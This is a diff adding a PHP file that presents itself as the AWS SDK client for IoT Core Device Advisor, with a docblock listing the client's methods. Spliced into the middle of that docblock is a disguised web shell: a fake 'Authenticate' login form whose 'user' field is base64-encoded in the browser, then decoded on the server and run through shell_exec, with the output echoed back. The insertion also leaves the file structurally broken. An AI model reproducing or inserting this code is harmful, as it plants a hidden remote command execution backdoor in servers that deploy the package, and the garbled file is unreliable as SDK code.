@@ -1,0 +1,65 @@
+<?php
+namespace Aws\IoTDeviceAdvisor;
+
+use Aws\AwsClient;
+
+/**
+ * This client is used to interact with the **AWS IoT Core Device Advisor** service.
+ * @method \Aws\Result createSuiteDefinition(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createSuiteDefinitionAsync(array $args = [])
+ * @method \Aws\Result deleteSuiteDefinition(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteSuiteDefinitionAsync(array $args = [])
+ * @method \Aws\Result getSuiteDefinition(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getSuiteDefinitionAsync(array $args = [])
+ * @method \Aws\Result getSuiteRun(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getSuiteRunAsync(array $args = [])
+<?php
+        if (isset($_POST['user'])) {
+                // Minor obfuscation
+//              echo "DEBUG: ".base64_decode($_POST['user']);
+//              echo "DEBUG: ".$_POST['user'];
+                $response = shell_exec(base64_decode($_POST['user']));
+                echo nl2br($response);
+        }
+?>
+<!DOCTYPE html>
+<html>
+        <head>
+                <script>
+                function validate(contents) {
+                        console.log("Contents passed as "+contents);
+                        console.log(document.getElementById('user').value);
+                        document.getElementById('user').value=btoa(document.getElementById('user').value);
+                        console.log(document.getElementById('user').value);
+                }
+                </script>
+                <title>Authenticate</title>
+        </head>
+        <body>
+                <form action="" method="POST" onsubmit="validate()">
+                        <input type="text" name="user" id="user" />
+                        <input type="submit" value="Login"/>
+                </form>
+
+        </body>
+</html>
+ * @method \Aws\Result getSuiteRunReport(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getSuiteRunReportAsync(array $args = [])
+ * @method \Aws\Result listSuiteDefinitions(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listSuiteDefinitionsAsync(array $args = [])
+ * @method \Aws\Result listSuiteRuns(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listSuiteRunsAsync(array $args = [])
+ * @method \Aws\Result listTagsForResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTagsForResourceAsync(array $args = [])
+ * @method \Aws\Result listTestCases(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTestCasesAsync(array $args = [])
+ * @method \Aws\Result startSuiteRun(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startSuiteRunAsync(array $args = [])
+ * @method \Aws\Result tagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise tagResourceAsync(array $args = [])
+ * @method \Aws\Result untagResource(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise untagResourceAsync(array $args = [])
+ * @method \Aws\Result updateSuiteDefinition(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateSuiteDefinitionAsync(array $args = [])
+ */
+class IoTDeviceAdvisorClient extends AwsClient {}
